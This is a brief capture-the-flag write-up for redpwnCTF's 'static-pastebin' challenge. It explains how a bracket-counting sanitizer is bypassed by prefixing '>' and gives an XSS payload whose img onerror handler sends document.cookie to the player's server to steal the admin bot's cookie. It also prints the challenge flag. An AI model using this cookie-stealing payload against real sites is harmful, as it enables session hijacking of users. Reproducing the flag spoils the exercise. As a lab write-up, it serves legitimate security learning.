---
title: "redpwnCTF: static-pastebin"
categories:
  - redpwnCTF
tags:
  - redpwnCTF
---

*I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it here*

*Site: static-pastebin.2020.redpwnc.tf*

---

For this challenge, we have a static pastebin that we can put text in. On the backend, we have javascript that increments a variable when a character is a "<" and decrements the variable if it's ">" recursively:

```
function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
```

We can see that the current character is only added to the payload if the variable is zero, which means we'll need to open the payload with a >, so it hits zero when the payload actually starts.

The following payload connects to our server:

```
><img src=x onerror=this.src='http://xx.xx.xx.xx/?c='+document.cookie>
```

We'll use this same payload on the second website we're given, to have the admin make a request to our server, thereby stealing his cookie. 

With this payload, we get the flag!

**flag{54n1t1z4t10n_k1nd4_h4rd}**

